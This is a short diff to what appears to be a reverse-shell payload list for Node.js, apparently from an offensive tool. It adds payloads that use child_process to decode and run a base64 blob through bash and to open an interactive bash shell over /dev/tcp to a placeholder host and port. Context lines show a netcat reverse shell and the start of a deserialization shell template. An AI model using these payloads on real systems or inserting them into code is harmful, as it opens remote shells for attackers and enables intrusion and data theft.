@@ -482,6 +482,14 @@ require("child_process").exec("nc -e /bin/sh {IP} {PORT}")
 
 #EXAMPLE
 
+require("child_process").exec("echo {BASE64} | base64 -d | bash")
+
+#EXAMPLE
+
+require("child_process").exec("bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+
+#EXAMPLE
+
 {NODEJS_DESERIALIZATION}
 var net = require('net');
 var spawn = require('child_process').spawn;
